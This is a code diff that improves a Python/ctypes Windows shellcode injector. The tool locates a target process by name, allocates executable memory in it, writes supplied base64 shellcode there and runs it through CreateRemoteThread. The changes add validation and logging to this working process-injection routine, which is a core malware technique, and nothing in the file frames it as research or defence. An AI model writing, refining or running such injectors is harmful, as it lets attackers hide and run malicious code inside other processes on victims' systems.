@@ -1,14 +1,46 @@
 import ctypes
 import logging
+import psutil
 from datetime import datetime
 import platform
 import base64
 
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
+
+def validate_shellcode(shellcode_b64):
+    """Validate base64 encoded shellcode"""
+    try:
+        decoded = base64.b64decode(shellcode_b64)
+        if len(decoded) == 0:
+            return False, "Empty shellcode"
+        return True, decoded
+    except Exception as e:
+        return False, f"Invalid base64 shellcode: {str(e)}"
+
 def inject_shellcode(process_name, shellcode_b64):
     """Inject shellcode into a target process"""
     try:
-        # Decode shellcode
-        shellcode = base64.b64decode(shellcode_b64)
+        # Validate inputs
+        if not process_name:
+            return {
+                'status': 'error',
+                'error': 'Process name is required',
+                'timestamp': datetime.now().isoformat()
+            }
+        
+        # Validate shellcode
+        valid, result = validate_shellcode(shellcode_b64)
+        if not valid:
+            return {
+                'status': 'error',
+                'error': result,
+                'timestamp': datetime.now().isoformat()
+            }
+        shellcode = result
         
         if platform.system() != 'Windows':
             return {
@@ -16,6 +48,8 @@ def inject_shellcode(process_name, shellcode_b64):
                 'error': 'Shellcode injection only supported on Windows',
                 'timestamp': datetime.now().isoformat()
             }
+            
+        logging.info(f"Attempting to inject shellcode into process: {process_name}")
             
         # Required Windows API functions
         kernel32 = ctypes.windll.kernel32
@@ -32,7 +66,6 @@ def inject_shellcode(process_name, shellcode_b64):
         PAGE_EXECUTE_READWRITE = 0x40
         
         # Find target process
-        import psutil
         target_pid = None
         for proc in psutil.process_iter(['pid', 'name']):
             if proc.info['name'].lower() == process_name.lower():
@@ -40,18 +73,24 @@ def inject_shellcode(process_name, shellcode_b64):
                 break
                 
         if not target_pid:
+            error_msg = f'Process {process_name} not found'
+            logging.error(error_msg)
             return {
                 'status': 'error',
-                'error': f'Process {process_name} not found',
+                'error': error_msg,
                 'timestamp': datetime.now().isoformat()
             }
+            
+        logging.info(f"Target process found. PID: {target_pid}")
             
         # Open target process
         process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
         if not process_handle:
+            error_msg = f'Failed to open process {process_name}'
+            logging.error(error_msg)
             return {
                 'status': 'error',
-                'error': f'Failed to open process {process_name}',
+                'error': error_msg,
                 'timestamp': datetime.now().isoformat()
             }
             
@@ -67,11 +106,15 @@ def inject_shellcode(process_name, shellcode_b64):
             )
             
             if not memory_address:
+                error_msg = 'Failed to allocate memory in target process'
+                logging.error(error_msg)
                 return {
                     'status': 'error',
-                    'error': 'Failed to allocate memory in target process',
+                    'error': error_msg,
                     'timestamp': datetime.now().isoformat()
                 }
+                
+            logging.info(f"Memory allocated at: {hex(memory_address)}")
                 
             # Write shellcode to allocated memory
             write_result = WriteProcessMemory(
@@ -83,11 +126,15 @@ def inject_shellcode(process_name, shellcode_b64):
             )
             
             if not write_result:
+                error_msg = 'Failed to write shellcode to target process'
+                logging.error(error_msg)
                 return {
                     'status': 'error',
-                    'error': 'Failed to write shellcode to target process',
+                    'error': error_msg,
                     'timestamp': datetime.now().isoformat()
                 }
+                
+            logging.info("Shellcode written to memory successfully")
                 
             # Create remote thread to execute shellcode
             thread_handle = CreateRemoteThread(
@@ -101,12 +148,16 @@ def inject_shellcode(process_name, shellcode_b64):
             )
             
             if not thread_handle:
+                error_msg = 'Failed to create remote thread'
+                logging.error(error_msg)
                 return {
                     'status': 'error',
-                    'error': 'Failed to create remote thread',
+                    'error': error_msg,
                     'timestamp': datetime.now().isoformat()
                 }
                 
+            logging.info("Remote thread created successfully")
+            
             return {
                 'status': 'success',
                 'message': f'Shellcode injected into {process_name} (PID: {target_pid})',
@@ -123,9 +174,10 @@ def inject_shellcode(process_name, shellcode_b64):
             CloseHandle(process_handle)
             
     except Exception as e:
-        logging.error(f"Error injecting shellcode: {str(e)}")
+        error_msg = f"Error injecting shellcode: {str(e)}"
+        logging.error(error_msg)
         return {
             'status': 'error',
-            'error': str(e),
+            'error': error_msg,
             'timestamp': datetime.now().isoformat()
         } 
